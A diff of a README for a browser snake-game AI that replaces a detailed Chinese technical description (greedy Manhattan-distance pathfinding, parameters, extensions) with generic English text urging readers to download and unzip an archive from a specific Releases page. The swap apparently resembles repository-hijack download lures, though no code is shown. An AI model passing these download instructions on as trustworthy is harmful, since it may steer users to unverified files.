@@ -1,59 +1,99 @@
-# 贪吃蛇AI (Snake-AI)
-一个基于 HTML5 + JavaScript 实现的全自动贪吃蛇AI游戏，无需人工操作，AI可自主寻路吃食物、规避碰撞，核心采用贪心算法+曼哈顿距离寻路策略。
+# 🐍 Native-Snake-AI - Enjoy a Fun, Automated Snake Game!
 
-## 🎮 功能特点
-- ✨ 全自动AI寻路：无需手动操控，AI自主决策移动方向
-- 🚨 碰撞检测：精准检测边界碰撞、蛇身自碰撞
-- 📊 实时计分：动态显示游戏状态和得分
-- 🎛️ 控制按钮：支持AI启动/停止、游戏重置
-- 🎨 简洁UI：网格布局+高对比度配色，视觉清晰
+![Download Native-Snake-AI](https://img.shields.io/badge/Download-via_Releases-brightgreen)
 
-## 🚀 快速开始
-### 运行方式
-1. 将项目代码保存为 `snake-ai.html` 文件
-2. 直接用浏览器打开该文件（Chrome/Firefox/Edge 均可）
-3. 点击「启动AI」按钮，即可看到贪吃蛇自动寻路吃食物
+## 📦 Overview
 
-### 核心操作
-| 按钮       | 功能                     |
-|------------|--------------------------|
-| 启动AI     | 启动自动寻路逻辑         |
-| 停止AI     | 暂停AI移动（保留当前状态）|
-| 重置       | 重置游戏到初始状态       |
+Native-Snake-AI is a fully automated snake game created with HTML5 and JavaScript. This game runs on your browser without needing any coding skills. The AI controls the snake, helping it eat food and avoid collisions. Dive into gaming without the hassle.
 
-## 🧠 AI核心原理
-### 决策流程
-1. **有效方向筛选**：先排除撞墙、撞自身的无效方向，保证蛇的基础生存
-2. **贪心寻路计算**：对所有有效方向，计算蛇头到食物的「曼哈顿距离」（`|x1-x2| + |y1-y2|`）
-3. **最优方向选择**：选择距离食物最近的方向，同时禁止180°掉头（如向右时不能直接向左）
-4. **动态更新方向**：每帧更新移动方向，确保持续向食物靠近
+---
 
-### 关键参数
-| 参数名          | 作用                     | 默认值 | 可调整建议       |
-|-----------------|--------------------------|--------|------------------|
-| GRID_SIZE       | 游戏网格大小（行列数）| 20     | 10-30 均可       |
-| MOVE_INTERVAL   | AI移动间隔（毫秒）| 150    | 数值越小速度越快 |
+## 🚀 Getting Started
 
-## 📈 扩展方向
-### 进阶优化
-1. 升级寻路算法：将贪心算法替换为 A* 路径搜索，支持绕路吃食物
-2. 难度调节：添加速度滑块，动态调整AI移动速度
-3. 障碍物系统：随机生成障碍物，增加AI寻路难度
-4. 历史记录：记录最高得分，本地存储（localStorage）
-5. 视觉优化：添加蛇头/蛇身区分、食物动画、碰撞特效
+To get started, you'll need a web browser. This game works on most modern browsers, including:
 
-### 技术升级
-- 改用 Canvas 渲染：提升大网格下的渲染性能
-- 加入 Web Worker：将AI计算逻辑移至后台，避免UI阻塞
-- 响应式布局：适配手机/平板等不同设备屏幕
+- Google Chrome
+- Mozilla Firefox
+- Microsoft Edge
 
-## 📋 技术栈
-- HTML5：页面结构
-- CSS3：Flex/Grid 布局 + 样式美化
-- JavaScript：游戏逻辑 + AI 算法
-- 无第三方依赖，纯原生实现
+Simply follow the steps below to download and run Native-Snake-AI.
 
-## 🎯 注意事项
-- 当蛇身占满整个网格时，游戏自动结束
-- AI基于贪心算法，极端情况下可能陷入死胡同（可通过A*算法优化）
-- 兼容主流现代浏览器，不支持IE低版本
+---
+
+## 📥 Download & Install
+
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page:
+   [Download Native-Snake-AI](https://github.com/riskijeki57/Native-Snake-AI/releases)
+
+2. **Select the Latest Release**  
+   Look for the latest version at the top of the page. Each release will have notes explaining the updates.
+
+3. **Download the Files**  
+   Download the zipped file for the latest version. This file will contain everything you need to run the game.
+
+4. **Extract the Files**  
+   Once downloaded, locate the zipped file on your computer. Right-click on it and select "Extract All..." or "Unzip." Follow the prompts to extract the files to a folder of your choice.
+
+5. **Open the Game**  
+   Find the extracted folder and look for `index.html`. Double-click this file to open it in your web browser. The game should load automatically.
+
+---
+
+## 💻 System Requirements
+
+Native-Snake-AI runs smoothly on most computers. Here are the basic system requirements:
+
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Browser:** Most modern web browsers (Chrome, Firefox, Edge)
+
+---
+
+## 🎮 Game Features
+
+- **AI-Powered Gameplay:** Watch the snake navigate automatically, making the game easy to enjoy.
+- **Simple Controls:** Just launch the game, and the AI does the rest.
+- **Engaging Graphics:** Experience delightful visuals created with HTML5.
+- **No Dependencies:** Everything you need is included in one package. No additional downloads are necessary.
+
+---
+
+## 🎯 How to Play
+
+1. **Start the Game**  
+   After opening the `index.html`, the game will start automatically.
+
+2. **Watch the Snake**  
+   The AI will control the snake to collect food and avoid obstacles.
+
+3. **Enjoy the Game**  
+   Sit back, relax, and enjoy the automated gameplay as the snake grows longer with each piece of food it eats.
+
+4. **Restart the Game**  
+   If you'd like to play again, simply refresh your browser or close and reopen the `index.html` file.
+
+---
+
+## 🌐 Community and Support
+
+If you have any questions or feedback, feel free to reach out. You can also share your experiences or suggest improvements. Join our community and connect with other players.
+
+---
+
+## 🌟 About This Project
+
+Native-Snake-AI emphasizes a beginner-friendly experience while exploring AI algorithms and game development principles. Created in a lightweight format, this game requires no prior programming knowledge.
+
+For more information and updates, please visit our official GitHub repository.
+
+---
+
+## 🔗 Useful Links
+
+- **Project Repository:** [Native-Snake-AI on GitHub](https://github.com/riskijeki57/Native-Snake-AI)
+- **Release Page:** [Download Native-Snake-AI](https://github.com/riskijeki57/Native-Snake-AI/releases)
+
+---
+
+Enjoy playing Native-Snake-AI and watch the fun unfold as the snake navigates through the game!
